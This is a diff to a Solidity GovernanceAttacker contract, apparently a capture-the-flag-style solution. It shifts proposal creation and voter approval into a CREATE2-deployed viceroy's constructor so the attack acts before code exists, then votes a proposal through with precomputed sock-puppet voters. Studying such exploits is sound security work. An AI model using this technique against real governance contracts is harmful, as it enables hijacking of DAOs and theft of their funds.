@@ -131,24 +131,22 @@ contract GovernanceAttacker {
         uint256 proposalId = uint256(keccak256(proposal));
 
         uint nonce = 1;
-        address preCalcedViceroy = getCreate2Address(type(AttackerViceroy).creationCode, nonce);
         address[] memory preCalcedVoters = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5);
+        bytes memory viceroyCreationCode = abi.encodePacked(
+            type(AttackerViceroy).creationCode,
+            abi.encode(governance, proposal, preCalcedVoters)
+        );
+        address preCalcedViceroy = getCreate2Address(viceroyCreationCode, nonce);
 
         // elect viceroy
         governance.appointViceroy(preCalcedViceroy, nonce);
 
         // deploy viceroy
-        AttackerViceroy viceroy = new AttackerViceroy{salt: bytes32(nonce)}();
+        AttackerViceroy viceroy = new AttackerViceroy{salt: bytes32(nonce)}(governance, proposal, preCalcedVoters);
         assert(address(viceroy) == preCalcedViceroy);
-
-        // elect voter
-        viceroy.electVoters(governance, preCalcedVoters);
 
         // deploy voter
         deployVoters(5);
-
-        // submit proposal
-        AttackerVoter(preCalcedVoters[0]).propose(governance, address(viceroy), proposal);
 
         // vote
         for (uint i; i < preCalcedVoters.length; i++) {
@@ -190,7 +188,8 @@ contract GovernanceAttacker {
 
 // TODO: propose in constructor
 contract AttackerViceroy {
-    function electVoters(Governance governance, address[] memory voters) public {
+    constructor(Governance governance, bytes memory proposal, address[] memory voters) {
+        governance.createProposal(address(this), proposal);
         for (uint i; i < voters.length; i++) {
             address voter = voters[i];
             governance.approveVoter(voter);
@@ -199,10 +198,6 @@ contract AttackerViceroy {
 }
 
 contract AttackerVoter {
-    function propose(Governance governance, address viceroy, bytes memory proposal) public {
-        governance.createProposal(viceroy, proposal);
-    }
-
     function vote(Governance governance, uint256 proposalId, address viceroy) public {
         governance.voteOnProposal(proposalId, true, viceroy);
     }
